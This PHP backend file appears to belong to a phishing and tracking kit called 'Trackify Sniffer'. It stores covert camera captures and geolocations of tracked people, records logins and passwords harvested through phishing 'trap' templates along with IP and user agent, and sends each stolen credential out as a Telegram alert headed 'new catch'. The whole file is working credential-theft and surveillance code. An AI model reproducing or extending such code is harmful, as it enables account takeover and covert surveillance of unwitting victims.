<?php
declare(strict_types=1);

/**
 * Per-account capture storage: resolve tracker token → user, paths under data/captures/u{id}/.
 */

function trackify_project_root(): string
{
    return __DIR__;
}

function trackify_pdo(): ?PDO
{
    static $pdo = null;
    if ($pdo instanceof PDO) {
        return $pdo;
    }
    $cfgFile = __DIR__ . '/config.php';
    if (!is_readable($cfgFile)) {
        return null;
    }
    $config = require $cfgFile;
    $db = $config['db'];
    $dsn = sprintf(
        'mysql:host=%s;port=%d;dbname=%s;charset=%s',
        $db['host'],
        $db['port'],
        $db['name'],
        $db['charset']
    );
    try {
        $pdo = new PDO($dsn, $db['user'], $db['pass'], [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
        return $pdo;
    } catch (Throwable $e) {
        return null;
    }
}

function trackify_normalize_token(?string $token): string
{
    $token = strtolower(trim((string) $token));
    return preg_replace('/[^a-f0-9]/', '', $token) ?? '';
}

function trackify_user_id_for_token(?string $token): ?int
{
    $token = trackify_normalize_token($token);
    if (strlen($token) < 32) {
        return null;
    }
    $pdo = trackify_pdo();
    if (!$pdo) {
        return null;
    }
    $stmt = $pdo->prepare('SELECT user_id FROM tracker_tokens WHERE token = ? LIMIT 1');
    $stmt->execute([$token]);
    $row = $stmt->fetch();
    return $row ? (int) $row['user_id'] : null;
}

function trackify_user_capture_dir(int $userId): string
{
    $dir = trackify_project_root() . '/data/captures/u' . $userId;
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    return $dir;
}

function trackify_max_photo_captures(): int
{
    return 25;
}

/** Total PNG camera captures stored for this user (all date folders). */
function trackify_count_user_photos(int $userId): int
{
    $dir = trackify_user_capture_dir($userId);
    $n = 0;
    foreach (glob($dir . '/20*', GLOB_ONLYDIR) ?: [] as $folder) {
        $n += count(glob($folder . '/*.png') ?: []);
    }

    return $n;
}

/**
 * Resolve a client-supplied relative path to an absolute PNG under this user's capture dir, or null if invalid.
 * Example path: data/captures/u3/2026-03-23/cam....png
 */
function trackify_resolve_user_photo_file(int $userId, string $clientPath): ?string
{
    $clientPath = str_replace('\\', '/', trim($clientPath));
    $prefix = 'data/captures/u' . $userId . '/';
    if (strncmp($clientPath, $prefix, strlen($prefix)) !== 0) {
        return null;
    }
    $rest = substr($clientPath, strlen($prefix));
    if ($rest === '' || strpos($rest, '..') !== false) {
        return null;
    }
    $parts = explode('/', $rest);
    if (count($parts) !== 2) {
        return null;
    }
    [$dateFolder, $file] = $parts;
    if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $dateFolder)) {
        return null;
    }
    if (!preg_match('/^[A-Za-z0-9._-]+\.png$/', $file)) {
        return null;
    }
    $captureDir = trackify_user_capture_dir($userId);
    $full = $captureDir . DIRECTORY_SEPARATOR . $dateFolder . DIRECTORY_SEPARATOR . $file;
    $realCapture = realpath($captureDir);
    if ($realCapture === false) {
        return null;
    }
    $realFile = realpath($full);
    if ($realFile === false || !is_file($realFile)) {
        return null;
    }
    $prefixRe = preg_quote($realCapture, '#') . preg_quote(DIRECTORY_SEPARATOR, '#');
    if (!preg_match('#^' . $prefixRe . '#', $realFile)) {
        return null;
    }

    return $realFile;
}

function trackify_issue_tracker_token(int $userId): ?string
{
    try {
        $pdo = trackify_pdo();
        if (!$pdo) {
            return null;
        }
        $token = bin2hex(random_bytes(32));
        $stmt = $pdo->prepare('INSERT INTO tracker_tokens (user_id, token) VALUES (?, ?)');
        $stmt->execute([$userId, $token]);
        return $token;
    } catch (Throwable $e) {
        return null;
    }
}

function trackify_append_geolocation(int $userId, array $entry): void
{
    $file = trackify_user_capture_dir($userId) . '/geolocations.json';
    $data = [];
    if (file_exists($file)) {
        $data = json_decode((string) file_get_contents($file), true) ?: [];
    }
    $data[] = $entry;
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function trackify_user_saved_info_dir(int $userId): string
{
    $dir = trackify_project_root() . '/data/saved_info/u' . $userId;
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    return $dir;
}

function trackify_max_saved_logins(): int
{
    return 500;
}

/**
 * @return array<int, array{at:string, login:string, password:string, template:string, ip:string, user_agent:string}>
 */
function trackify_read_saved_logins(int $userId): array
{
    $file = trackify_user_saved_info_dir($userId) . '/logins.json';
    if (!is_readable($file)) {
        return [];
    }
    $raw = file_get_contents($file);
    if ($raw === false || $raw === '') {
        return [];
    }
    $list = json_decode($raw, true);
    if (!is_array($list)) {
        return [];
    }

    return array_reverse($list);
}

/**
 * @return bool true when stored
 */
function trackify_append_saved_login(int $userId, string $login, string $password, string $template, string $clientIp, string $userAgent): bool
{
    $trunc = static function (string $s, int $max): string {
        if (function_exists('mb_substr')) {
            return mb_substr($s, 0, $max, 'UTF-8');
        }

        return strlen($s) <= $max ? $s : substr($s, 0, $max);
    };
    $login = $trunc($login, 512);
    $password = $trunc($password, 512);
    $template = preg_replace('/[^a-z0-9._-]/i', '', $trunc($template, 48)) ?? '';
    if ($template === '') {
        $template = 'unknown';
    }
    $userAgent = $trunc($userAgent, 400);

    $dir = trackify_user_saved_info_dir($userId);
    $file = $dir . '/logins.json';
    $fp = @fopen($file, 'c+');
    if ($fp === false) {
        return false;
    }
    if (!flock($fp, LOCK_EX)) {
        fclose($fp);

        return false;
    }
    $raw = stream_get_contents($fp);
    $list = [];
    if (is_string($raw) && $raw !== '') {
        $decoded = json_decode($raw, true);
        if (is_array($decoded)) {
            $list = $decoded;
        }
    }
    $at = gmdate('c');
    $list[] = [
        'at' => $at,
        'login' => $login,
        'password' => $password,
        'template' => $template,
        'ip' => $clientIp,
        'user_agent' => $userAgent,
    ];
    $max = trackify_max_saved_logins();
    if (count($list) > $max) {
        $list = array_slice($list, -$max);
    }
    rewind($fp);
    ftruncate($fp, 0);
    fwrite($fp, json_encode($list, JSON_UNESCAPED_UNICODE));
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);

    @file_put_contents($dir . '/login_notify.txt', gmdate('c') . "\n", FILE_APPEND | LOCK_EX);

    trackify_notify_sniffer_capture_telegram($login, $password, $template, $clientIp, $userAgent, $at);

    return true;
}

/**
 * Escape text for Telegram HTML parse mode (&lt; &gt; &amp;).
 */
function trackify_telegram_html_escape(string $s): string
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function trackify_trunc_utf8(string $s, int $max): string
{
    if ($max < 1) {
        return '';
    }
    if (function_exists('mb_strlen') && function_exists('mb_substr')) {
        if (mb_strlen($s, 'UTF-8') <= $max) {
            return $s;
        }

        return mb_substr($s, 0, $max - 1, 'UTF-8') . '…';
    }

    return strlen($s) <= $max ? $s : substr($s, 0, $max - 1) . '…';
}

/**
 * Whether Telegram delivery is allowed (telegram_config.json "enabled" flag).
 * Missing key defaults to true for older configs.
 */
function trackify_telegram_notifications_enabled_in_array(array $j): bool
{
    if (!array_key_exists('enabled', $j)) {
        return true;
    }
    $v = $j['enabled'];
    if ($v === false || $v === 0 || $v === '0') {
        return false;
    }
    if (is_string($v) && strtolower(trim($v)) === 'false') {
        return false;
    }

    return true;
}

/**
 * @return array{bot_token:string, chat_id:string}|null  null if missing, invalid, or notifications disabled
 */
function trackify_read_telegram_credentials(): ?array
{
    $path = trackify_project_root() . '/telegram_config.json';
    if (!is_readable($path)) {
        return null;
    }
    $raw = file_get_contents($path);
    if ($raw === false || $raw === '') {
        return null;
    }
    $j = json_decode($raw, true);
    if (!is_array($j)) {
        return null;
    }
    $token = trim((string) ($j['bot_token'] ?? ''));
    $chat = trim((string) ($j['chat_id'] ?? ''));
    if ($token === '' || $chat === '') {
        return null;
    }
    if (!trackify_telegram_notifications_enabled_in_array($j)) {
        return null;
    }

    return ['bot_token' => $token, 'chat_id' => $chat];
}

/**
 * Rich Sniffer alert (HTML) — same bot/chat as Trackify telegram_config.json.
 */
function trackify_format_sniffer_capture_telegram(
    string $login,
    string $password,
    string $template,
    string $clientIp,
    string $userAgent,
    string $utcIso
): string {
    $e = 'trackify_telegram_html_escape';
    $trapLabel = $e(ucwords(str_replace(['_', '-'], ' ', $template)));
    $cred = static function (string $v) use ($e): string {
        $v = trim($v);

        return $v === '' ? '<i>—</i>' : '<code>' . $e($v) . '</code>';
    };
    $ipDisp = trim($clientIp) === '' ? '<i>—</i>' : '<code>' . $e(trim($clientIp)) . '</code>';
    $uaTrim = trackify_trunc_utf8(trim($userAgent), 360);
    $uaDisp = $uaTrim === '' ? '<i>—</i>' : '<i>' . $e($uaTrim) . '</i>';
    $when = $e($utcIso);

    return <<<HTML
🥷 <b>Sniffer · new catch</b>

<b>Trap</b> · <code>{$trapLabel}</code>

👤 <b>Login</b>
{$cred($login)}

🔐 <b>Password</b>
{$cred($password)}

🌐 <b>IP</b>
{$ipDisp}

🕐 <b>UTC</b>
<code>{$when}</code>

📱 <b>Client</b>
{$uaDisp}

<i>──────────────</i>
<i>Trackify Sniffer</i>
HTML;
}

/**
 * Send HTML message via Telegram Bot API (silent on missing config / failure; logs API errors).
 *
 * @param bool $disableWebPagePreview When true (default), Telegram hides link previews (used for Sniffer alerts).
 *                                    Pass false to allow previews (e.g. Facebook profile URLs in Facebook checker alerts).
 */
function trackify_send_telegram_html(string $html, bool $disableWebPagePreview = true): void
{
    $creds = trackify_read_telegram_credentials();
    if ($creds === null) {
        return;
    }
    $url = 'https://api.telegram.org/bot' . rawurlencode($creds['bot_token']) . '/sendMessage';
    $payload = json_encode([
        'chat_id' => $creds['chat_id'],
        'text' => $html,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => $disableWebPagePreview,
    ], JSON_UNESCAPED_UNICODE);
    if ($payload === false) {
        return;
    }
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 18,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);
    $raw = @file_get_contents($url, false, $ctx);
    if ($raw === false || $raw === '') {
        return;
    }
    $json = json_decode($raw, true);
    if (is_array($json) && empty($json['ok']) && isset($json['description']) && is_string($json['description'])) {
        @error_log('Trackify Telegram (Sniffer): ' . $json['description'] . "\n", 3, trackify_project_root() . '/telegram_error.log');
    }
}

/**
 * Send a photo using an HTTPS URL (Telegram fetches the image). Caption supports HTML; max length 1024.
 *
 * @return bool True if Telegram accepted the message
 */
function trackify_send_telegram_photo_url(string $photoUrl, string $captionHtml): bool
{
    $creds = trackify_read_telegram_credentials();
    if ($creds === null) {
        return false;
    }
    $photoUrl = trim($photoUrl);
    if ($photoUrl === '' || strlen($photoUrl) > 2048) {
        return false;
    }
    if (!preg_match('#^https://#i', $photoUrl)) {
        return false;
    }
    if (strlen($captionHtml) > 1024) {
        $captionHtml = trackify_trunc_utf8($captionHtml, 1020) . '…';
    }
    $api = 'https://api.telegram.org/bot' . rawurlencode($creds['bot_token']) . '/sendPhoto';
    $payload = json_encode([
        'chat_id' => $creds['chat_id'],
        'photo' => $photoUrl,
        'caption' => $captionHtml,
        'parse_mode' => 'HTML',
    ], JSON_UNESCAPED_UNICODE);
    if ($payload === false) {
        return false;
    }
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 35,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);
    $raw = @file_get_contents($api, false, $ctx);
    if ($raw === false || $raw === '') {
        return false;
    }
    $json = json_decode($raw, true);
    if (is_array($json) && !empty($json['ok'])) {
        return true;
    }
    if (is_array($json) && isset($json['description']) && is_string($json['description'])) {
        @error_log('Trackify Telegram (photo): ' . $json['description'] . "\n", 3, trackify_project_root() . '/telegram_error.log');
    }

    return false;
}

function trackify_notify_sniffer_capture_telegram(
    string $login,
    string $password,
    string $template,
    string $clientIp,
    string $userAgent,
    string $utcIso
): void {
    $html = trackify_format_sniffer_capture_telegram($login, $password, $template, $clientIp, $userAgent, $utcIso);
    if (strlen($html) > 4000) {
        $html = trackify_trunc_utf8($html, 3990) . '…';
    }
    trackify_send_telegram_html($html);
}

function trackify_clear_saved_logins(int $userId): bool
{
    $dir = trackify_user_saved_info_dir($userId);
    $ok = true;
    foreach (['/logins.json', '/login_notify.txt'] as $suffix) {
        $p = $dir . $suffix;
        if (is_file($p) && !@unlink($p)) {
            $ok = false;
        }
    }

    return $ok;
}
